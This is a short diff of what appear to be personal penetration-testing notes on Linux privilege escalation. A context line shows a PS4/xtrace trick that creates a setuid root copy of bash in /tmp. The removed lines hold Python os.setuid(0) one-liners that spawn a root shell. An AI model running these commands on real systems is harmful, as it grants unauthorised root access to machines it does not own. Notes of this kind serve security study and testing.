@@ -359,29 +359,3 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 
 </div></div>
 
-
-### 
-<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">
-
-
-
-set to root
-```shell
-python3 -c 'import os; os.setuid(0); os.system("whoami")'
-```
-
-set to root and open a bash 
-```shell
-python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
-```
-
-Option to show the results
-```python
-import os; print(os.popen("ls -l").read())
-```
-
-subproccess.run([comando])
-
-with sys module too
-
-</div></div>
